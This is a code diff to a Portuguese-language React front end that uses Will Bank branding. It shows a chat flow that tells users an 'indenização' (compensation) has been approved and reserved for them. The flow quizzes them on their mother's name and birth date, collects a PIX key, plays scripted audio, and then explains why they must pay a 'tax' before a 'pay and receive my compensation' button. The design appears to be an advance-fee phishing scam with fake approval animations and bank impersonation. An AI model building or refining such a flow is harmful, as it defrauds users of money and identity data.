+                  className="bg-slate-700 hover:bg-slate-600 text-white border border-slate-600 rounded-full font-medium shadow-lg text-sm"
+                >
+                  {option.text}
+                </Button>
+              ))}
+              
+              {step === "quiz-nascimento" && quizOptions.length > 0 && quizOptions.map((option, index) => (
+                <Button
+                  key={`nasc-${index}-${option.text}`}
+                  onClick={() => handleQuizAnswer(option, "nascimento")}
+                  className="bg-slate-700 hover:bg-slate-600 text-white border border-slate-600 rounded-full font-medium shadow-lg text-sm"
+                >
+                  {option.text}
+                </Button>
+              ))}
 
-              {step === "pix-selection" && (waitingForAudio === null || audioListened.has("/audio/audio-3.mp3")) && (
+              {step === "audio-1-approval" && (waitingForAudio === null || audioListened.has("/audio/audio-1.mp3")) && (
                 <Button onClick={handleAprovarIndenizacao} className="bg-gradient-to-r from-green-500 to-emerald-500 hover:from-green-600 hover:to-emerald-600 text-white rounded-full font-bold shadow-lg px-8">
-                  ✓ APROVAR INDENIZAÇÃO
+                  ✓ SIM, APROVAR INDENIZAÇÃO
                 </Button>
               )}
 
-              {step === "pix-selection" && waitingForAudio === "/audio/audio-3.mp3" && !audioListened.has("/audio/audio-3.mp3") && (
+              {step === "audio-1-approval" && waitingForAudio === "/audio/audio-1.mp3" && !audioListened.has("/audio/audio-1.mp3") && (
                 <p className="text-slate-400 text-sm animate-pulse">🎧 Ouça o áudio acima para continuar...</p>
               )}
 
               {step === "pix-type-selection" && (
                 <div className="flex flex-col gap-2 w-full max-w-xs">
+                  <Button onClick={handlePixTypeTelefone} variant="outline" className="bg-slate-700 hover:bg-slate-600 text-white border-slate-600 rounded-full font-bold shadow-lg px-8">
+                    📱 Telefone
+                  </Button>
                   <Button onClick={handlePixTypeCPF} className="bg-gradient-to-r from-primary to-amber-400 text-primary-foreground rounded-full font-bold shadow-lg px-8">
                     📋 CPF
                   </Button>
@@ -847,13 +943,13 @@ const handleQuizAnswer = async (option: QuizOption, quizType: "mae" | "nasciment
                 </Button>
               )}
 
-              {step === "comprovante-final" && (waitingForAudio === null || audioListened.has("/audio/audio-2.mp3")) && (
+              {step === "audio-2-comprovante" && (waitingForAudio === null || audioListened.has("/audio/audio-2.mp3")) && (
                 <Button onClick={handleGenerateComprovante} className="bg-gradient-to-r from-primary to-amber-400 text-primary-foreground rounded-full font-bold shadow-lg px-8">
-                  GERAR COMPROVANTE
+                  CONFIRMAR
                 </Button>
               )}
 
-              {step === "comprovante-final" && waitingForAudio === "/audio/audio-2.mp3" && !audioListened.has("/audio/audio-2.mp3") && (
+              {step === "audio-2-comprovante" && waitingForAudio === "/audio/audio-2.mp3" && !audioListened.has("/audio/audio-2.mp3") && (
                 <p className="text-slate-400 text-sm animate-pulse">🎧 Ouça o áudio acima para continuar...</p>
               )}
 
@@ -861,28 +957,28 @@ const handleQuizAnswer = async (option: QuizOption, quizType: "mae" | "nasciment
                 <div className="flex flex-col gap-2 w-full max-w-xs">
                   <Button onClick={handleSMSOption} className="bg-gradient-to-r from-primary to-amber-400 text-primary-foreground rounded-full font-bold shadow-lg px-8 flex items-center gap-2">
                     <Smartphone className="w-4 h-4" />
-                    📱 Receber por SMS
+                    Receber por SMS
                   </Button>
                   <Button onClick={handleEmailOption} variant="outline" className="bg-slate-700 hover:bg-slate-600 text-white border-slate-600 rounded-full font-bold shadow-lg px-8 flex items-center gap-2">
                     <Mail className="w-4 h-4" />
-                    📧 Receber por E-mail
+                    Receber por E-mail
                   </Button>
                 </div>
               )}
 
-              {step === "taxa-explanation" && (
+              {step === "taxa-info" && (
                 <Button onClick={handleTaxExplanation} className="bg-gradient-to-r from-orange-500 to-amber-500 hover:from-orange-600 hover:to-amber-600 text-white rounded-full font-bold shadow-lg">
-                  ❓ Por que tenho que pagar?
+                  ❓ PORQUE TENHO QUE PAGAR ESSE IMPOSTO?
                 </Button>
               )}
 
-              {step === "final" && (waitingForAudio === null || audioListened.has("/audio/audio-1.mp3")) && (
+              {step === "final" && (waitingForAudio === null || audioListened.has("/audio/audio-3.mp3")) && (
                 <Button onClick={handleFinalPayment} className="bg-gradient-to-r from-green-500 to-emerald-500 hover:from-green-600 hover:to-emerald-600 text-white rounded-full font-bold shadow-lg px-6 animate-pulse">
-                  💰 PAGAR E RECEBER
+                  💰 Concluir pagamento e receber minha indenização
                 </Button>
               )}
 
-              {step === "final" && waitingForAudio === "/audio/audio-1.mp3" && !audioListened.has("/audio/audio-1.mp3") && (
+              {step === "final" && waitingForAudio === "/audio/audio-3.mp3" && !audioListened.has("/audio/audio-3.mp3") && (
                 <p className="text-slate-400 text-sm animate-pulse">🎧 Ouça o áudio acima para continuar...</p>
               )}
             </div>
@@ -924,7 +1020,26 @@ const handleQuizAnswer = async (option: QuizOption, quizType: "mae" | "nasciment
               />
               {emailInput && (
                 <Button 
-                  onClick={selectedPixType === "email" ? handleEmailPixSubmit : handleEnvioEmailSubmit} 
+                  onClick={handleEnvioEmailSubmit} 
+                  size="icon" 
+                  className="rounded-full bg-primary hover:bg-primary/90 w-10 h-10"
+                >
+                  <Send className="w-5 h-5" />
+                </Button>
+              )}
+            </div>
+          ) : showPixInput ? (
+            <div className="flex-1 flex gap-2">
+              <Input
+                placeholder={selectedPixType === "email" ? "seuemail@exemplo.com" : "(00) 00000-0000"}
+                type={selectedPixType === "email" ? "email" : "text"}
+                value={pixKeyInput}
+                onChange={(e) => setPixKeyInput(e.target.value)}
+                className="flex-1 bg-slate-700 border-slate-600 text-white placeholder:text-slate-400 rounded-full"
+              />
+              {pixKeyInput && (
+                <Button 
+                  onClick={handlePixKeySubmit} 
                   size="icon" 
                   className="rounded-full bg-primary hover:bg-primary/90 w-10 h-10"
                 >
@@ -959,12 +1074,6 @@ const DataRow = ({ label, value, highlight = false }: { label: string; value: st
     </div>
   );
 };
-
-const StepDot = ({ completed }: { completed: boolean }) => (
-  <div className={`w-8 h-8 rounded-full flex items-center justify-center ${completed ? 'bg-gradient-to-br from-primary to-amber-400' : 'bg-muted'}`}>
-    {completed && <Check className="w-4 h-4 text-primary-foreground" />}
-  </div>
-);
 
 const AudioPlayerComponent = ({ audioSrc, isPlaying, onPlay, listened }: { audioSrc: string; isPlaying: boolean; onPlay: () => void; listened?: boolean }) => (
   <div className="flex items-center gap-3 w-48">
@@ -1005,8 +1114,8 @@ const AudioPlayerComponent = ({ audioSrc, isPlaying, onPlay, listened }: { audio
   </div>
 );
 
-// Approval Animation Component
-const ApprovalAnimation = ({ value }: { value: number }) => {
+// Approval Animation Component - Like the reference image
+const ApprovalAnimation = ({ value, name }: { value: number; name: string }) => {
   const [step1, setStep1] = useState(false);
   const [step2, setStep2] = useState(false);
   const [step3, setStep3] = useState(false);
@@ -1032,20 +1141,38 @@ const ApprovalAnimation = ({ value }: { value: number }) => {
         <img src={willbankLogo} alt="Will Bank" className="h-10" />
       </div>
       
-      <div className="flex items-center justify-center gap-3">
-        <AnimatedCheckDot completed={step1} />
+      <div className="h-1 bg-gradient-to-r from-primary via-primary to-amber-400 rounded-full" />
+      
+      <div className="flex items-center justify-center gap-2">
+        <div className="flex flex-col items-center gap-1">
+          <AnimatedCheckDot completed={step1} />
+          <span className="text-[10px] text-muted-foreground">Solicitando Aprovação</span>
+        </div>
         <div className={`w-8 h-0.5 transition-all duration-500 ${step1 && step2 ? 'bg-primary' : 'bg-muted'}`} />
-        <AnimatedCheckDot completed={step2} />
+        <div className="flex flex-col items-center gap-1">
+          <AnimatedCheckDot completed={step2} />
+          <span className="text-[10px] text-muted-foreground">Analisando Dados</span>
+        </div>
         <div className={`w-8 h-0.5 transition-all duration-500 ${step2 && step3 ? 'bg-primary' : 'bg-muted'}`} />
-        <AnimatedCheckDot completed={step3} />
+        <div className="flex flex-col items-center gap-1">
+          <AnimatedCheckDot completed={step3} />
+          <span className="text-[10px] text-muted-foreground">Indenização Aprovada</span>
+        </div>
       </div>
 
       <div className="text-center space-y-2">
-        <p className={`text-sm text-muted-foreground transition-opacity duration-500 ${showValue ? 'opacity-100' : 'opacity-0'}`}>
-          Valor aprovado
+        <p className={`font-bold text-foreground transition-opacity duration-500 ${showValue ? 'opacity-100' : 'opacity-50'}`}>
+          {name}
         </p>
-        <p className={`text-3xl font-black text-green-600 transition-all duration-700 ${showValue ? 'opacity-100 scale-100' : 'opacity-0 scale-75'}`}>
+        <p className={`text-sm text-muted-foreground transition-opacity duration-500 ${showValue ? 'opacity-100' : 'opacity-0'}`}>
+          Sua indenização no valor de
+        </p>
+        <p className={`text-3xl font-black text-primary transition-all duration-700 ${showValue ? 'opacity-100 scale-100' : 'opacity-0 scale-75'}`}>
           R$ {value.toLocaleString('pt-BR', { minimumFractionDigits: 2 })}
+        </p>
+        <p className={`text-xs text-muted-foreground transition-opacity duration-500 ${showValue ? 'opacity-100' : 'opacity-0'}`}>
+          Este valor está reservado para você.<br />
+          Complete os próximos passos para receber sua indenização ainda hoje.
         </p>
       </div>
     </div>
